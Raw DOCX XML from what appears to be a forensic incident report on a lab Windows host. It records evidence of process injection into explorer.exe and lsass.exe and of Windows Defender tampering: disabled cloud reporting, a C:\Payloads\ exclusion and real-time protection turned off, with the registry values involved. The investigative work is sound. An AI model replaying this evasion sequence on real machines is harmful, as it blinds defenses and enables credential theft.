              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 8 | Microsoft-Windows-Sysmon | CreateRemoteThread | StartAddress: 0x0000000000B30000 | RuleName: - | SourceProcessID: 2196, SourceProcessGUID: e6e9f951-0ded-654e-8f01-000000000500 | SourceImage: C:\Payloads\pscp.exe | TargetProcessID: 7324, TargetProcessGUID: e6e9f951-0ded-654e-9001-000000000500 | TargetImage: C</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18652</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:03:56.300284</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 8 | Microsoft-Windows-Sysmon | CreateRemoteThread | StartAddress: 0x0000028F43080000 | RuleName: - | SourceProcessID: 7324, SourceProcessGUID: e6e9f951-0ded-654e-9001-000000000500 | SourceImage: C:\Windows\explorer.exe | TargetProcessID: 648, TargetProcessGUID: e6e9f951-0900-654e-0c00-000000000500 | TargetImage:</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18654</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:03:09.877971</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.\pscp.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#8742</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-PowerShell%4Operational.evtx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r>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:03:09.990000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Detection Hayabusa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>medium</w:t>
              <w:br/>
              <w:t>Proc Injection | {"SrcProc":"C:\\Payloads\\pscp.exe","TgtProc":"C:\\Windows\\explorer.exe","SrcPID":2196,"SrcPGUID":"E6E9F951-0DED-654E-8F01-000000000500","TgtPID":7324,"TgtPGUID":"E6E9F951-0DED-654E-9001-000000000500"} | {"NewThreadId":5968,"RuleName":"-","SourceUser":"DESKTOP-KJ81A5A\\medmondson","StartAddress":"0x0000000000B30000","StartFunction</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#1574</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:03:56.300000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Detection Hayabusa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>medium</w:t>
              <w:br/>
              <w:t>Proc Injection | {"SrcProc":"C:\\Windows\\explorer.exe","TgtProc":"C:\\Windows\\system32\\lsass.exe","SrcPID":7324,"SrcPGUID":"E6E9F951-0DED-654E-9001-000000000500","TgtPID":648,"TgtPGUID":"E6E9F951-0900-654E-0C00-000000000500"} | {"NewThreadId":2988,"RuleName":"-","SourceUser":"DESKTOP-KJ81A5A\\medmondson","StartAddress":"0x0000028F43080000","Star</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#1575</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-004: Windows Defender tampering: Tamper Protection toggled, path exclusion C:\Payloads\, cloud reporting disabled, real-time protection disabled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artifact:defender (exclusions)</w:t>
              <w:br/>
              <w:t>artifact:registry (recmd kroll)</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-sysmon%4operational.evtx</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-windows defender%4operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Category</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>defense evasion</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>MITRE ATT&amp;CK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>T1562.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2023-11-10 10:17:40.345882 → 2023-11-10 11:02:12.400713</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Defender/Operational EID 5007: 10:17:40 SpyNetReporting 0x2→0x0 (RecordID 18); 10:17:41 SubmitSamplesConsent 0x1→0x0 (19); 10:17:43 Features\TamperProtection 0x1→0x0 (20) then back to 0x1 at 10:17:45 (21); 10:19:24.979 new value HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\Payloads\ = 0x0 (RecordID 25, Zircolite 'Windows Defender Exclusions Added'); PowerShell Defender CIM module (MSFT_MpPreference cmdletization) loaded 10:19:09–10:19:10 (Hayabusa 'Potentially Malicious PwSh', PS/Operational 4104 RecordIDs 7–20). EID 5001 Real-time protection disabled at 10:19:46.897 (RecordID 29) and again at 11:02:12.400 (RecordID 53). Sysmon EID 13 (RecordID 292) 11:02:11.567 HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring = DWORD 1 written by MsMpEng.exe (PID 6388) as SYSTEM. Registry (Dissect) Defender exclusion Paths = C:\Payloads\ (key mtime 10:52:49 UTC).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>True positive (deliberate impairment of defenses, consistent with the lab scenario). Sequence: after two blocked downloads the user turned off cloud reporting/sample submission, added the C:\Payloads\ exclusion via the Defender settings (MpPreference), disabled real-time protection, then re-downloaded pscp.exe into C:\Payloads\. Second RTP disable at 11:02:12, seconds before pscp.exe execution at 11:03:09. MsMpEng writing DisableRealtimeMonitoring is the expected result of a UI/PowerShell toggle, not an attacker process writing the key directly. It cannot be told whether the actor was the lab operator acting as the "attacker" or a third party; it is done interactively in the medmondson session.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Evidence (13)</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10:17:40.345882</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Defender\SpyNet\SpyNetReporting = 0x2 | New Value: HKLM\SOFTWARE\Microsoft\Windows Defender\SpyNet\SpyNetReporting = 0x0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#23717</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:17:41.861519</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Defender\SpyNet\SubmitSamplesConsent = 0x1 | New Value: HKLM\SOFTWARE\Microsoft\Windows Defender\SpyNet\SubmitSamplesConsent = 0x0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#23718</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:17:43.064472</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Defender\Features\TamperProtection = 0x1 | New Value: HKLM\SOFTWARE\Microsoft\Windows Defender\Features\TamperProtection = 0x0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#23719</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:24.979452</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 New Value: HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\Payloads\ = 0x0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#23724</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:46.897377</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Windows Defender/Operational 5001 | Microsoft-Windows-Windows Defender | Real-time Protection was disabled | %%827</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#23728</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:02:12.400713</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Windows Defender/Operational 5001 | Microsoft-Windows-Windows Defender | Real-time Protection was disabled | Windows Defender Antivirus</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#23752</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:02:11.567907</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 13 | Microsoft-Windows-Sysmon | RegistryEvent (Value Set) | ProcessID: 6388, ProcessGUID: e6e9f951-0b81-654e-1901-000000000500 | RuleName: T1089,Tamper-Defender | Image: C:\ProgramData\Microsoft\Windows Defender\platform\4.18.23100.2009-0\MsMpEng.exe | EventType: SetValue | TargetObject: HKLM\SOFTWARE\Microsoft\</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18637</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:52:49.247112</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Defender (exclusions)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>exclusion: regf_mtime</w:t>
              <w:br/>
              <w:t>type=Paths | value=C:\Payloads\</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>dissect/defender.exclusions.jsonl#2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:02:11.558959</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\Microsoft\Windows Defender\Real-Time Protection</w:t>
              <w:br/>
              <w:t>Threat Hunting | Windows Defender | DisableRealtimeMonitoring=1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_C.csv#1447</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Defender\Exclusions\Paths</w:t>
              <w:br/>
              <w:t>Threat Hunting | Windows Defender | C:\Payloads\=0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_C.csv#1456</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SpyNetReporting=0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_C.csv#1443</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SubmitSamplesConsent=0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_C.csv#1444</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\config\SOFTWARE</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:02:09.773548</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>consent.exe 6492 420 0000019A5C0280F0</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 5392, ProcessGUID: e6e9f951-0db1-654e-8301-000000000500 | RuleName: - | MD5=EE2A1C85C472F89B146CC8EE598CCCBC,SHA256=19FD0010DA92B654D1CA270247061A39EA13C0A58529FD8257A97E2EF7794911,IMPHASH=522D83761201075834F05037F5307949 | ParentProcess: C:\Windows\Sy</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
